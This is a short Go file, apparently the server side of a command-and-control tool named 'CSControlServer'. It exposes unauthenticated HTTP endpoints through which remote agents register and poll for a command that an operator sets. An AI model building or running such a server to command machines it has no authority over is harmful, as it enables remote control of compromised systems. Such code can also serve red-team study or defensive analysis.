package fiber

import (
	"CSControlServer/types"
	"github.com/gofiber/fiber/v2"
)

func InitServer() {
	agent := types.Client{}
	responsecmd := "01"
	app := fiber.New()
	app.Static("/", "../public")
	app.Post("/", LoadcmdPostFile)
	app.Get("/getcmd", func(ctx *fiber.Ctx) error {
		return ctx.SendString(responsecmd)
	})
	app.Get("/newClient", func(ctx *fiber.Ctx) error {
		//LoadcmdIDFile(ctx)
		agent = InitNewClient(ctx, agent)
		return ctx.SendString(PrintAgentsInfoCompact(agent))
	})
	app.Get("/DebugClient", func(ctx *fiber.Ctx) error {
		return ctx.SendString("")
	})

	app.Get("/postcmd", func(ctx *fiber.Ctx) error {
		LoadcmdPostFile(ctx)
		responsecmd = ctx.FormValue("command")
		return ctx.SendString(responsecmd)
	})

	app.Get("/shutdown", func(ctx *fiber.Ctx) error {
		return app.Shutdown()
	})
	app.Get("/getagents", func(ctx *fiber.Ctx) error {
		return ctx.SendString(PrintAgentsInfoCompact(agent))
	})
	app.Get("/getdebug", func(ctx *fiber.Ctx) error {
		return ctx.SendString(debug)
	})

	err := app.Listen(":80")
	if err != nil {
		return
	}

}
